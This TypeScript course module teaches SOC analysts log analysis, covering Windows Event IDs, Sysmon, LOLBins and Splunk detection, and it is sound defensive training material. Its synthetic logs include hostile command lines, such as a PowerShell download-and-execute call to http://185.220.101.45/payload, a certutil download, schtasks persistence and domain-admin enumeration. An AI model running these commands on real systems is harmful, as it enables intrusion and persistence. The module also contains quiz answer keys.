import type { Session } from '@/types/content'

const FILE = 'defensive_day_2_log_analysis_esl.md'

export const session02: Session = {
  number: 2,
  slug: 'log-analysis',
  title: 'Log Analysis: Reading the Raw Evidence',
  summary:
    'What Windows, Linux and web servers actually record — and the critical things Windows does not record until you turn them on.',
  abstract:
    'Session 1 triaged alerts. Those alerts were built from logs, and this session goes to the source. You will learn the Windows Security Event IDs that carry authentication and persistence, what Sysmon adds that the default logs cannot give you, how Linux auth logs and web server logs read, and why a parent-child process relationship is one of the most precise detection signals available. The practical reconstructs a full compromise from log evidence alone.',
  track: 'core',
  themes: ['Event IDs', 'Sysmon', 'LOLBins'],
  prerequisites: [
    'Session 1 — SOC tiers, the log pipeline, and the six-question triage checklist',
    'Basic familiarity with a command line for the Linux examples',
  ],
  outcomes: [
    'Identify the Windows Security Event IDs that carry authentication, privilege and persistence evidence, and state what each one proves',
    'Explain which high-value logging is disabled by default on Windows and what becomes undetectable without it',
    'Read a Sysmon process-creation chain and reconstruct the execution sequence it records',
    'Detect LOLBin abuse by reasoning about command-line arguments rather than binary names',
    'Distinguish a false positive from a true positive using context, timing, frequency, corroboration and baseline',
    'Write a detection query that is specific enough to be quiet and broad enough to catch variations',
  ],
  sourceFiles: [FILE],
  sourceNotes: [
    'The source file is titled "Log Analysis and Detection Engineering" and its section 8 introduces detection query writing. Detection engineering is covered in full in Session 4 from its own source file. This session treats query writing as the bridge it is — enough to read and modify a query — and leaves rule design, tuning cycles and coverage mapping to Session 4. The overlap is in the source material, not introduced here.',
    'The file\'s forward pointer again names threat hunting as the next day; the supplied sequence puts phishing investigation next. The backward chain is consistent and is what this course follows.',
  ],

  theory: {
    minutes: 90,
    blocks: [
      {
        kind: 'title',
        id: 'open',
        title: 'Session 2',
        overline: 'Defensive Track · Session 02 of 10',
        lead:
          'Every alert you triaged yesterday was assembled from lines like these. Today you read the lines.',
        provenance: 'source',
        sources: [{ file: FILE, section: '2. Introduction' }],
      },

      {
        kind: 'retrieval',
        id: 'retrieval',
        title: 'Recall from Session 1',
        minutes: 6,
        recallPrompt: 'From memory. These are the facts this session builds directly on top of.',
        questions: [
          'Name the five stages of the log pipeline, and the one that fails most silently.',
          'A SIEM correlation rule has not fired in a year. Name two different explanations.',
          'What question does a Tier 1 analyst ask instead of "is this bad?"',
          'What does Event ID 4624 record, and what does it not tell you?',
        ],
        answers: [
          'Source, collector, parsing, normalisation, search and alerting. The collector fails most silently — an agent that was never installed produces no error, just an absence.',
          'Either the pattern genuinely has not occurred, or the log source feeding the rule stopped reporting. A dashboard renders both as nothing.',
          '"Is this unusual for this user, this host, this environment?" Baseline is the deciding input.',
          'A successful logon: who, from where, and what logon type. It does not tell you what the session then did — that is endpoint execution telemetry, which is a different source.',
        ],
        provenance: 'supplementary',
      },

      {
        kind: 'scenario',
        id: 'scenario',
        title: 'Opening scenario: the alert with no story',
        minutes: 4,
        synthetic: true,
        setting: 'Financial services firm. 02:14 on a Thursday.',
        narrative: [
          'A SIEM alert fires: "Encoded PowerShell command executed on FINANCE-PC-04."',
          'That is the entire alert. One line. No parent process, no decoded command, no network context, no indication of what happened next.',
          'Your job before the shift ends is to turn that one line into a timeline that names the initial access, the execution, the payload, and the persistence — using nothing but logs.',
        ],
        drivingQuestion:
          'Which log sources would you need, in which order, and what would each one add that the one before it could not?',
        provenance: 'source',
        sources: [{ file: FILE, section: '7. Scenario Walkthrough: Encoded PowerShell on a Finance Machine' }],
      },

      {
        kind: 'objectives',
        id: 'objectives',
        title: 'What you will be able to do',
        minutes: 3,
        provenance: 'supplementary',
        objectives: [
          { verb: 'Identify', text: 'the Windows Event IDs carrying authentication, privilege and persistence evidence' },
          { verb: 'Explain', text: 'what Windows does not log by default, and what that makes invisible' },
          { verb: 'Reconstruct', text: 'an execution chain from a Sysmon process-creation sequence' },
          { verb: 'Detect', text: 'LOLBin abuse from arguments rather than binary names' },
          { verb: 'Distinguish', text: 'false from true positives using the five-part assessment framework' },
          { verb: 'Write', text: 'a detection query that is both specific and broad enough to be useful' },
        ],
      },

      {
        kind: 'concept',
        id: 'win-events',
        title: 'The Windows Security log, and the seven Event IDs that carry most of it',
        minutes: 6,
        lead:
          'Windows records system activity as numbered events. Hundreds of types exist; a small number carry most of the defensive value.',
        points: [
          '4624 — successful logon. Who, from where, and crucially the LogonType. This is the baseline for all authentication analysis.',
          '4625 — failed logon. One is a typo. Many from one source in seconds is a brute-force attempt.',
          '4648 — logon using explicit credentials. Often lateral movement: someone using credentials that are not their own session\'s.',
          '4672 — special privileges assigned. The session is administrative. Watch for SeDebugPrivilege.',
          '4698 — scheduled task created. A favourite persistence mechanism, and rare enough outside deployment windows to be a strong signal.',
          '4720 — user account created. An unexpected new account is a backdoor until proven otherwise.',
          '7045 (System log) — a new service was installed. The other classic persistence mechanism.',
        ],
        callout: {
          tone: 'note',
          text: 'LogonType is the field that makes 4624 useful. Type 2 is console, 3 is network, 5 is service, 10 is RDP. A service account producing Type 10 is a structural anomaly — this is the check that broke the first alert in Session 1.',
        },
        redView:
          'Default Windows logging has well-known gaps. Process creation with command line (4688) is off by default, so many environments have no record of what commands ran. An attacker who knows the defaults knows exactly which actions leave no trace.',
        blueView:
          'Default logging is not a security configuration. Process Creation Auditing with command-line capture, PowerShell Script Block Logging and Object Access Auditing on sensitive directories must all be deployed by Group Policy before an incident. They cannot be applied retroactively — turning them on after the fact gives you no view of the past.',
        provenance: 'source',
        sources: [{ file: FILE, section: '4.1 Windows Event Logs and Critical Event IDs' }],
        detail: [
          'The practical consequence of 4688 being disabled by default is worth stating plainly: in a default-configured Windows estate, you can see that an account logged on and that a scheduled task was created, but not a single command that ran in between. The attacker\'s actual activity is the part that is missing.',
          'Microsoft publishes the authoritative schema for every event ID and field named here. Confirm against that documentation before writing production detection logic; this page is a teaching summary, not a reference.',
        ],
      },

      {
        kind: 'compare',
        id: 'sysmon',
        title: 'Sysmon: from "something ran" to "here is the whole chain"',
        minutes: 6,
        lead:
          'The default Event Log tells you that something happened. Sysmon tells you what happened and everything attached to it.',
        columns: [{ label: 'Without Sysmon' }, { label: 'With Sysmon' }],
        rows: [
          {
            label: 'What you see',
            cells: [
              'cmd.exe ran on this machine.',
              'WINWORD.EXE launched cmd.exe, which launched powershell.exe -enc <base64>. That process queried DNS for an external domain, connected outbound to a specific address and port, then wrote a file to C:\\Users\\Public.',
            ],
          },
          {
            label: 'Process creation',
            cells: ['Event 4688, if enabled, often without command line', 'Event ID 1 — full command line, parent process, image hash'],
          },
          {
            label: 'Network attribution',
            cells: ['Firewall logs show the host, not the process', 'Event ID 3 — which process made which connection'],
          },
          {
            label: 'DNS attribution',
            cells: ['DNS server logs show the host', 'Event ID 22 — which process resolved which domain'],
          },
          {
            label: 'File writes',
            cells: ['Only with Object Access Auditing on that path', 'Event ID 11 — new executables and payloads dropped to disk'],
          },
          {
            label: 'Injection',
            cells: ['Not visible', 'Event ID 8 — CreateRemoteThread between processes'],
          },
          {
            label: 'Cost',
            cells: ['None', 'Hundreds of events per minute per active host — must be forwarded to a SIEM, never reviewed by hand'],
          },
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '4.2 Sysmon: Supercharging Endpoint Visibility' }],
        detail: [
          'Sysmon is a free Microsoft Sysinternals tool. Its value depends almost entirely on its configuration file — a default install logs far less that is useful than a maintained ruleset does. The SwiftOnSecurity and Olaf Hartong configurations are the widely used community baselines named in the source material.',
          'Event IDs 1, 3 and 8 are the three with the highest detection value: process creation with full command line, network connection attributed to a process, and remote thread creation. If you can only have three, have those.',
          'The volume is real and is the usual objection from infrastructure teams. The answer is not to reduce Sysmon but to forward it: Sysmon output is SIEM input, not something a human reads on the host.',
        ],
      },

      {
        kind: 'concept',
        id: 'linux',
        title: 'Linux: plain text, searchable, and deletable',
        minutes: 4,
        lead:
          'Linux writes logs as text files in /var/log/. That makes them easy to read with standard tools — and easy for an attacker with root to edit.',
        points: [
          '/var/log/auth.log (Debian) or /var/log/secure (RHEL) — SSH logins, sudo use, failed passwords. The main source for unauthorised access.',
          '/var/log/syslog — services, kernel messages, daemon events. Where cron execution traces survive after a crontab entry is deleted.',
          '/var/log/wtmp and btmp — binary login and failed-login history, read with last and lastb.',
          'Three failed passwords followed by an accepted one, from the same address, is the SSH equivalent of the 4625→4624 correlation from Session 1.',
          'Root logins over SSH should be disabled. Any that appear are immediately suspicious rather than merely unusual.',
        ],
        callout: {
          tone: 'warn',
          text: 'auth.log records what the PAM subsystem reports. An attacker with root can edit or truncate it directly, and truncation leaves no event of its own — unlike Windows, where clearing the Security log generates Event ID 1102. This asymmetry returns in Session 6.',
        },
        redView:
          'Linux logs are local by default. Root access means the ability to rewrite the record. history -c and editing .bash_history suppress shell history, and some authentication bypasses never reach PAM at all.',
        blueView:
          'Forward Linux logs to a SIEM before an incident, not during one. auditd gives deeper coverage than auth.log alone — file access, command execution, syscalls — and it keeps working when shell history is disabled.',
        provenance: 'source',
        sources: [{ file: FILE, section: '4.3 Linux System and Auth Logs' }],
      },

      {
        kind: 'concept',
        id: 'weblogs',
        title: 'Web server logs: every request, and the codes that matter',
        minutes: 4,
        lead:
          'Apache, Nginx and IIS record every request made to them. One line contains source, time, method, path, status and size.',
        points: [
          '200 with a sensitive path (/admin, /config, /backup) — success where success should not be possible.',
          '403 in sequence — someone probing the boundary of what they can reach.',
          '404 in volume — directory scanning or fuzzing for hidden paths.',
          '500 — may indicate an injection that caused an unhandled exception, which means the input reached the engine.',
          'Attack syntax in parameters — ../ for traversal, UNION SELECT for SQL injection, <script> for XSS. The syntax in the request is the evidence, not the response code.',
        ],
        callout: {
          tone: 'rule',
          text: 'A successful SQL injection often returns 200. The response code tells you the server answered, not what it did. Look for the injection syntax in the request parameters.',
        },
        redView:
          'Web logs record what was sent, not what the application did with it. User-Agent strings are freely forged and source addresses rotate, so volume-based detection on either is weak.',
        blueView:
          'Web logs correlate or they do little. One line showing an injection attempt is interesting. The same source address appearing in authentication logs sixty seconds later with a successful admin login is an incident.',
        provenance: 'source',
        sources: [{ file: FILE, section: '4.4 Web Server Logs' }],
      },

      {
        kind: 'concept',
        id: 'lolbins',
        title: 'LOLBins: the attack that is signed by Microsoft',
        minutes: 6,
        lead:
          'Living off the Land Binaries are legitimate, signed Windows executables that attackers use for malicious purposes. They are chosen precisely because the system trusts them.',
        points: [
          'certutil.exe — certificate management. Abused with -urlcache -f to download files from the internet.',
          'mshta.exe — runs HTML applications. Abused to execute remote scripts.',
          'regsvr32.exe — registers COM DLLs. Abused to run remote scriptlets and bypass application allowlisting.',
          'rundll32.exe — loads DLL functions. Abused to execute malicious DLLs without creating a new process image.',
          'bitsadmin.exe — background transfer service. Abused to download tooling through a trusted Windows service.',
          'wscript.exe / cscript.exe — Windows Script Host. Abused to run VBScript and JScript payloads.',
        ],
        callout: {
          tone: 'rule',
          text: 'The detection is never "certutil.exe ran" — it runs legitimately all day. The detection is "certutil.exe ran with -urlcache and a URL argument." Build logic around arguments, not binary names.',
        },
        redView:
          'Signature-based tools will never flag certutil.exe, because it is a genuine Windows component. An environment with no command-line argument logging lets an entire attack chain run without one signature alert.',
        blueView:
          'LOLBin detection requires argument visibility — Event ID 4688 with command line enabled, or Sysmon Event ID 1. If LOLBin rules never fire in your environment, verify your argument logging before concluding you are not being targeted. The LOLBAS project catalogues the known abuse techniques and the detection opportunities for each.',
        provenance: 'source',
        sources: [{ file: FILE, section: '4.5 Command-Line Auditing and LOLBins' }],
        detail: [
          'The suspicious command-line patterns worth memorising, with their technique IDs as given in the source: powershell -enc <base64> is T1059.001; net user /add is T1136.001; certutil -urlcache -f <url> is T1105; wmic process call create is T1047; schtasks /create is T1053.005; reg add HKCU\\...\\Run is T1547.001.',
          'A sequence of whoami, ipconfig and net group in rapid succession is post-exploitation reconnaissance (T1087, T1016). Individually each is a normal administrative command; in sequence, within seconds, under a non-administrative account, they are an orientation routine.',
        ],
      },

      {
        kind: 'evidence',
        id: 'demo',
        title: 'Instructor demonstration: FINANCE-PC-04, line by line',
        minutes: 11,
        synthetic: true,
        lead:
          'This is the full log evidence behind the one-line alert from the opening scenario. Select each line. Watch a single alert become a five-stage attack chain.',
        caption: 'Synthetic Sysmon and Windows Security events from FINANCE-PC-04, merged and time-ordered',
        source: 'Fabricated for teaching. Field names follow the Sysmon and Windows Security schemas.',
        lines: [
          {
            text: '02:09:41  4624  jsmith  LogonType=2  FINANCE-PC-04',
            note: {
              kind: 'observation',
              label: 'Normal interactive logon',
              body: 'LogonType 2 records an interactive logon. It does not prove who was physically present or that the session was legitimate. Here it establishes an account session before the later process activity; attribution remains a separate question.',
            },
          },
          {
            text: '02:14:33  Sysmon:1  EXCEL.EXE → powershell.exe -enc SQBFAFgAIAAoAE4AZQB3...',
            note: {
              kind: 'attack',
              label: 'The parent-child relationship is the finding',
              body: 'Sysmon Event ID 1 records process creation with the parent. A spreadsheet spawning PowerShell is a high-value lead, but legitimate automation can produce it. Check the command, user, baseline and follow-on activity before attributing malicious intent. PowerShell execution maps to T1059.001; the mapping alone does not establish compromise.',
            },
          },
          {
            text: '02:14:35  [decoded]  IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.45/payload\')',
            note: {
              kind: 'confirmed',
              label: 'Decoded — intent is now explicit',
              body: 'The base64 decodes to a download-and-execute command. Decoding moves this from "an encoded command ran", which is a hypothesis about intent, to "a download from a specific external address was attempted", which is a confirmed finding. CyberChef does this in seconds and it should be a reflex, not a final step.',
            },
          },
          {
            text: '02:14:41  Sysmon:3  powershell.exe → 185.220.101.45:443  (outbound, established)',
            note: {
              kind: 'confirmed',
              label: 'Network evidence corroborates decoded intent',
              body: 'Event ID 3 attributes a network connection to a process. The decoded command said it would connect; the network event says it did. The connection event supports an observed action beyond decoded intent. Both events come from the same host and collector, so do not call them fully independent sources. Note the port — 443 blends with ordinary HTTPS traffic and tells you nothing by itself.',
            },
          },
          {
            text: '02:14:55  Sysmon:11  File created: C:\\Users\\Public\\svchost32.exe',
            note: {
              kind: 'confirmed',
              label: 'The payload landed',
              body: 'Two tells in one line. C:\\Users\\Public is world-writable and an unexpected executable there needs investigation. The filename imitates svchost.exe, a real Windows process — but the real one lives in System32 and there is no svchost32.exe in Windows. Name-mimicry plus wrong-path is a reliable masquerading signature (T1036).',
            },
          },
          {
            text: '02:15:12  4698  Scheduled task created: WindowsUpdate_Helper → C:\\Users\\Public\\svchost32.exe',
            note: {
              kind: 'confirmed',
              label: 'Persistence — this is why reimaging matters',
              body: 'Event ID 4698. The task references the dropped binary and creates a persistence opportunity. Check its trigger, enabled state and execution records before claiming it ran or survived a reboot. Note the name does the same imitation trick as the binary. T1053.005.',
            },
          },
          {
            text: '02:15:14  4672  jsmith  SeDebugPrivilege SeImpersonatePrivilege',
            note: {
              kind: 'uncertain',
              label: 'Capability, not act',
              body: 'The session holds privileges that would permit reading another process\'s memory — the prerequisite for credential dumping. The log shows the capability was granted. It does not show it was used. Record this as an open question for Tier 2 and resist writing "credentials were stolen" in a report it does not support.',
            },
          },
        ],
        proves: [
          'Excel spawned PowerShell with an encoded command at 02:14:33 on FINANCE-PC-04',
          'The decoded command instructed a download from 185.220.101.45, and a connection to that address was established eight seconds later',
          'An executable was written to C:\\Users\\Public and a scheduled task was created to run it',
          'A scheduled task references the executable as a persistence mechanism; inspect its trigger and execution evidence before claiming it survived reboot',
        ],
        doesNotProve: [
          'That credentials were dumped — the privilege was granted, not demonstrably used',
          'That the attacker moved to any other host; nothing here is lateral movement evidence',
          'That this was the first compromise of this machine, or the only one',
          'That jsmith did anything wrong — the logon at 02:09 is a separate question from the macro at 02:14, and conflating them is how investigations wrongly accuse people',
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '7. Scenario Walkthrough: Encoded PowerShell on a Finance Machine' }],
        detail: [
          'Walk the room through what each new source added. 4624 gave the session. Sysmon 1 gave the parent-child relationship and the command. Decoding gave intent. Sysmon 3 corroborated it with network evidence. Sysmon 11 gave the artefact on disk. 4698 gave persistence. Six sources, six distinct contributions, and no single one of them would have supported the conclusion alone.',
          'The last line is the teaching moment. Students want to write "the attacker dumped credentials" because the privilege is there and the narrative wants it. Hold the line: capability is not act, and a report that claims more than its evidence supports is the report that falls apart under scrutiny.',
        ],
      },

      {
        kind: 'interaction',
        id: 'log-hunt',
        title: 'Guided analysis: find the chain in the noise',
        minutes: 13,
        component: 'log-investigation',
        lead:
          'A realistic log window — mostly ordinary activity, with one attack chain running through it. Flag the lines that belong to the chain, then commit your answer.',
        teaches:
          'That attack evidence is sparse and surrounded by legitimate activity, and that the reliable way to find it is to look for broken relationships — a wrong parent, a wrong path, a wrong logon type — rather than to look for things that appear sinister.',
        provenance: 'source',
        sources: [
          { file: FILE, section: '4.6 Suspicious Process Behavior Detection' },
          { file: FILE, section: '4.7 False Positive Identification' },
        ],
        data: {
          caption: 'Synthetic Sysmon Event ID 1 window from HR-WS-08, 09:00–09:30',
          note: 'Six of these twenty-two lines belong to one attack chain. The rest are ordinary workstation activity.',
          lines: [
            { id: 'l01', text: '09:01:02  explorer.exe → OUTLOOK.EXE', malicious: false, why: 'The user opened their mail client from the desktop. Entirely ordinary.' },
            { id: 'l02', text: '09:03:44  explorer.exe → chrome.exe', malicious: false, why: 'Browser launched from the desktop shell. Ordinary.' },
            { id: 'l03', text: '09:06:18  services.exe → MsMpEng.exe', malicious: false, why: 'Windows Defender\'s engine, started by the service control manager. Exactly the right parent.' },
            { id: 'l04', text: '09:08:51  OUTLOOK.EXE → WINWORD.EXE', malicious: false, why: 'A user opened a document attachment. Suspicious as a route, entirely normal as an event — and on its own it is not evidence of anything.' },
            { id: 'l05', text: '09:09:03  WINWORD.EXE → cmd.exe /c powershell -w hidden -enc JABwAD0A...', malicious: true, why: 'A word processor spawning a command interpreter is unusual and needs context. Add -w hidden, which suppresses the window from the user, and an encoded command. This is the start of the chain. T1059.001.' },
            { id: 'l06', text: '09:09:04  cmd.exe → powershell.exe -w hidden -enc JABwAD0A...', malicious: true, why: 'The second link. cmd.exe is acting purely as a launcher for PowerShell, which is what the macro\'s shell call produces.' },
            { id: 'l07', text: '09:09:11  chrome.exe → chrome.exe (renderer)', malicious: false, why: 'Chrome spawns its own sandboxed child processes constantly. High volume, no signal.' },
            { id: 'l08', text: '09:09:29  powershell.exe → certutil.exe -urlcache -split -f http://185.220.101.45/a.txt', malicious: true, why: 'A LOLBin used for its abuse case. certutil is a certificate utility; -urlcache -f makes it a downloader. The binary is signed by Microsoft and the argument is the entire finding. T1105.' },
            { id: 'l09', text: '09:10:02  explorer.exe → notepad.exe', malicious: false, why: 'A user opened Notepad. Ordinary.' },
            { id: 'l10', text: '09:11:37  svchost.exe → taskhostw.exe', malicious: false, why: 'Standard Windows task host activity with the correct parent.' },
            { id: 'l11', text: '09:12:08  powershell.exe → whoami.exe', malicious: true, why: 'Orientation. On its own, whoami is harmless and common in scripts. Spawned by the same PowerShell process that just downloaded a file, it is the first step of reconnaissance. T1033.' },
            { id: 'l12', text: '09:12:09  powershell.exe → net.exe group "Domain Admins" /domain', malicious: true, why: 'Enumerating domain administrators, one second after whoami, from a non-administrative user session. This is a mapping routine, not an administrator at work. T1069.002.' },
            { id: 'l13', text: '09:12:44  OUTLOOK.EXE → chrome.exe', malicious: false, why: 'A user clicked a link in an email. Ordinary — and a useful contrast with line 5, which is the same shape of event with a wholly different meaning.' },
            { id: 'l14', text: '09:14:20  services.exe → spoolsv.exe', malicious: false, why: 'The print spooler starting under the service control manager. Correct parent, correct path.' },
            { id: 'l15', text: '09:15:51  explorer.exe → EXCEL.EXE', malicious: false, why: 'A user opened a spreadsheet from the desktop. Ordinary.' },
            { id: 'l16', text: '09:17:33  powershell.exe → schtasks.exe /create /tn "OneDriveSync" /tr C:\\Users\\Public\\od.exe /sc onlogon', malicious: true, why: 'Persistence. A task named after a trusted product, pointing at a world-writable directory, triggering on every logon. The name is designed to survive a casual review of the task list. T1053.005.' },
            { id: 'l17', text: '09:18:02  explorer.exe → SnippingTool.exe', malicious: false, why: 'A user took a screenshot. Ordinary.' },
            { id: 'l18', text: '09:19:40  MsMpEng.exe → MpCmdRun.exe', malicious: false, why: 'Defender invoking its own command-line utility. Correct parent, expected behaviour.' },
            { id: 'l19', text: '09:21:15  chrome.exe → chrome.exe (renderer)', malicious: false, why: 'More browser children. Ordinary.' },
            { id: 'l20', text: '09:23:48  explorer.exe → Teams.exe', malicious: false, why: 'A collaboration client launched from the shell. Ordinary.' },
            { id: 'l21', text: '09:26:02  svchost.exe → WmiPrvSE.exe', malicious: false, why: 'The WMI provider host under svchost. Normal on its own — but remember this one. In Session 9 you will hunt for WmiPrvSE.exe spawning children, which is a different and much more interesting event.' },
            { id: 'l22', text: '09:28:19  explorer.exe → calc.exe', malicious: false, why: 'A user opened the calculator. Ordinary.' },
          ],
          debrief:
            'The six chain lines share one property: in every case the parent-child relationship is wrong, or the argument contradicts the binary\'s purpose. None of them is found by looking for things that seem sinister. Line 21 is included deliberately — it looks like the others until you check the parent, and checking is the whole skill.',
        },
      },

      {
        kind: 'query',
        id: 'query',
        title: 'Writing a detection query that will actually survive production',
        minutes: 11,
        language: 'splunk',
        assumes:
          'Splunk SPL, with Sysmon forwarded to a sourcetype indexed as "sysmon" and fields normalised to the Splunk Common Information Model. Field names differ in Sentinel KQL and Elastic EQL; the logic is portable, the syntax is not.',
        lead:
          'This is the rule that would have caught the chain you just worked through. Read it clause by clause, then read what it misses.',
        code: `index=sysmon EventCode=1
(ParentImage="*\\\\WINWORD.EXE"
  OR ParentImage="*\\\\EXCEL.EXE"
  OR ParentImage="*\\\\POWERPNT.EXE")
(Image="*\\\\cmd.exe"
  OR Image="*\\\\powershell.exe"
  OR Image="*\\\\wscript.exe"
  OR Image="*\\\\mshta.exe")
| table _time, host, user, ParentImage, Image, CommandLine
| sort _time`,
        walkthrough: [
          { part: 'index=sysmon EventCode=1', explains: 'Restrict to Sysmon process-creation events. Starting narrow here is what keeps the query fast over months of data.' },
          { part: 'ParentImage = any Office application', explains: 'The parent is the subject of this rule. Note the trailing wildcard — matching on path suffix avoids missing installations in non-standard directories.' },
          { part: 'Image = any script or shell interpreter', explains: 'Four interpreters, not one. An attacker who switches from PowerShell to mshta defeats a single-value rule; this is the "broad enough" half of rule quality.' },
          { part: '| table …', explains: 'Project only the fields an analyst needs to triage. CommandLine is the field that carries the actual finding.' },
          { part: '| sort _time', explains: 'Chronological order, so a chain across several events reads as a sequence rather than a set.' },
        ],
        expected:
          'In a healthy environment, near zero results over weeks. Some legitimate Office automation can spawn interpreters. Validate each result against the baseline and corroborating activity — which is exactly the property that makes this rule worth having.',
        limitations: [
          'It will not fire without Sysmon deployed and forwarded. The rule looks healthy and returns nothing either way.',
          'It only names three Office binaries. OUTLOOK.EXE, MSACCESS.EXE and VISIO.EXE are equally capable parents and are not covered.',
          'Template injection, where the document loads a remote macro, still produces this parent-child pattern — but a maldoc that only sets a scheduled task via COM may not spawn a visible child at all.',
          'Some software deployment and licensing tools legitimately trigger shells from Office processes. These must be excluded by parent path and account, not by disabling the rule.',
          'It detects execution only. The certutil download and the schtasks persistence on lines 8 and 16 of the previous exercise need their own rules.',
        ],
        provenance: 'source',
        sources: [{ file: FILE, section: '8. Defender\'s View: Detection Query Writing' }],
        detail: [
          'The three requirements of a good detection query from the source material: specific enough that it does not fire on normal activity; broad enough that it does not miss common variations of the same technique; and documented, so the next analyst knows what a true positive looks like.',
          'AI tools draft queries like this quickly and that is a genuine accelerant. The rule the source states, and this course repeats: a human analyst validates before deployment. AI does not know that svc_deploy is legitimate on your build agents, or that your licensing tool spawns shells from Excel every Tuesday.',
        ],
      },

      {
        kind: 'concept',
        id: 'fp',
        title: 'The five-part false positive assessment',
        minutes: 6,
        lead:
          'A large part of Tier 1 time is spent deciding that something suspicious has an innocent explanation. Getting that wrong in either direction is expensive.',
        points: [
          'Context — is this normal for this specific user or system, given its history?',
          'Timing — does it align with business activity, a maintenance window, or a scheduled job?',
          'Frequency — one failed login and five hundred are different events, not the same event scaled.',
          'Corroboration — does this appear in multiple independent sources? One source is weak; three agreeing are hard to explain away.',
          'Baseline — does this differ from what this machine or account normally does?',
        ],
        callout: {
          tone: 'rule',
          text: 'The same event can be a false positive for one account and a confirmed incident for another. The event is never the answer; the context is.',
        },
        redView:
          'False positive rates work for the attacker. An operator who knows which legitimate activity produces the same signature as their technique can schedule their work to coincide with it — reconnaissance during a maintenance window, transfers that look like the nightly backup.',
        blueView:
          'The goal is not zero false positives, which is unachievable and would require rules too narrow to catch anything. The goal is a rate low enough that analysts still read the queue. A rule firing on every PowerShell execution is useless; one firing on encoded commands from non-administrative accounts outside business hours is precise enough to act on.',
        provenance: 'source',
        sources: [{ file: FILE, section: '4.7 False Positive Identification' }],
        detail: [
          'Common false positives from the source material and how to confirm them: a single 4625 at 09:00 followed by a success is a mistyped password; encoded PowerShell from an IT administrator may be a legitimate management script, confirmable against change management records; a large overnight transfer may be backup software, confirmable by checking the source process and destination; a new scheduled task may be patch management, confirmable against the deployment schedule.',
          'Notice that every confirmation step in that list is a lookup into a second, independent source. That is the corroboration criterion doing the work.',
        ],
      },

      {
        kind: 'check',
        id: 'check',
        title: 'Knowledge check',
        minutes: 6,
        provenance: 'supplementary',
        questions: [
          {
            id: 'q1',
            stem: 'Your LOLBin detection rules have never fired in two years of operation. What is the most likely explanation?',
            options: [
              {
                text: 'Command-line argument logging is not enabled, so the rules have nothing to match against',
                correct: true,
                feedback:
                  'Most likely. LOLBin detection depends entirely on arguments, and Event ID 4688 does not capture command lines by default. The rules are syntactically fine and structurally blind.',
              },
              {
                text: 'The organisation is genuinely not being targeted with LOLBin techniques',
                correct: false,
                feedback:
                  'Possible but improbable — LOLBins are among the most widely used techniques precisely because they are hard to detect. Verify your telemetry before accepting the comfortable explanation.',
              },
              {
                text: 'LOLBins are blocked by application allowlisting',
                correct: false,
                feedback:
                  'Allowlisting rarely blocks these — they are signed Microsoft binaries, which is exactly why attackers choose them. And a blocked execution would still generate an event.',
              },
              {
                text: 'The rules need to be mapped to ATT&CK before they can fire',
                correct: false,
                feedback: 'Mapping is metadata for coverage reporting. It has no effect on whether a rule matches data.',
              },
            ],
          },
          {
            id: 'q2',
            stem: 'Which gives you the strongest evidence that a document-based attack occurred?',
            options: [
              {
                text: 'WINWORD.EXE spawning powershell.exe',
                correct: true,
                feedback:
                  'Correct. This is the strongest lead among the choices, but it still needs context: legitimate Office automation can spawn interpreters. Confirm the command, baseline and follow-on activity.',
              },
              {
                text: 'powershell.exe running with an encoded command',
                correct: false,
                feedback:
                  'Suspicious, but genuinely common in legitimate automation — the second alert in the Session 1 triage console was exactly this, and it was benign. Needs the parent to be meaningful.',
              },
              {
                text: 'A network connection to an external address on port 443',
                correct: false,
                feedback: 'That describes most of the traffic a workstation generates all day.',
              },
              {
                text: 'A file written to a user directory',
                correct: false,
                feedback: 'Happens constantly. The path matters — C:\\Users\\Public is notable — but on its own this is weak.',
              },
            ],
          },
          {
            id: 'q3',
            stem: 'An attacker runs "history -c" on a compromised Linux host. What has that actually achieved?',
            options: [
              {
                text: 'It clears the in-memory history of the current shell session, and may leave the .bash_history file on disk untouched',
                correct: true,
                feedback:
                  'Correct, and this is a detail that returns in Session 6. A .bash_history file that is unexpectedly empty — or that has a modification timestamp matching the intrusion — is itself evidence. auditd records execve independently of the shell regardless.',
              },
              {
                text: 'It permanently removes all record of every command the attacker ran',
                correct: false,
                feedback:
                  'Only if the shell is the only thing recording. auditd, syslog, and any SIEM-forwarded data are all unaffected by it.',
              },
              {
                text: 'It generates a log-clearing event similar to Windows Event ID 1102',
                correct: false,
                feedback:
                  'It does not, and that asymmetry matters. Windows announces a Security log clear with Event ID 1102; Linux history clearing and log truncation announce nothing.',
              },
              {
                text: 'It disables auth.log for the remainder of the session',
                correct: false,
                feedback: 'Shell history and authentication logging are unrelated subsystems.',
              },
            ],
          },
        ],
      },

      {
        kind: 'recap',
        id: 'theory-recap',
        title: 'Before the practical',
        minutes: 4,
        provenance: 'source',
        sources: [{ file: FILE, section: '12. Actionable Takeaways' }],
        takeaways: [
          'Enable what Windows does not log by default — 4688 with command lines, Script Block Logging, Sysmon — before you need it. It cannot be applied to the past.',
          'Parent-child relationships are valuable detection signals when assessed against the host baseline, arguments and follow-on activity.',
          'Detect LOLBins by argument, never by binary name.',
          'Every false positive must be documented and fed back, without exception.',
          'Corroboration across independent sources is what turns a suspicion into a finding.',
        ],
        furtherStudy: [
          { label: 'LOLBAS Project', note: 'The catalogue of living-off-the-land binaries, with abuse techniques and detection notes for each.', href: 'https://lolbas-project.github.io/' },
          { label: 'Sysmon documentation (Microsoft Sysinternals)', note: 'The authoritative event reference and configuration guide.', href: 'https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon' },
          { label: 'CyberChef', note: 'Decodes base64, URL encoding and layered obfuscation. Used in every practical from here on.', href: 'https://gchq.github.io/CyberChef/' },
        ],
      },
    ],
  },

  practical: {
    minutes: 90,
    title: 'Workshop: Reconstruct the compromise from logs alone',
    blocks: [
      {
        kind: 'brief',
        id: 'brief',
        title: 'Briefing',
        minutes: 10,
        synthetic: true,
        resourceDir: 'log-analysis',
        scenario:
          'HR-WS-08 was flagged by a user who reported their machine "running slowly". You have four hours of merged log evidence from that host: Windows Security events, Sysmon events, and the proxy log for the same window. No EDR console, no memory image, no disk image. Logs only.',
        objectives: [
          'Reconstruct the full attack chain from initial access to persistence, with a timestamp and an evidence source for every step',
          'Decode any obfuscated commands and state what they do',
          'Separate the attack chain from the legitimate activity surrounding it',
          'Map each confirmed step to an ATT&CK technique',
          'Identify what you cannot determine from logs alone, and name the evidence source that would resolve it',
        ],
        requires: [
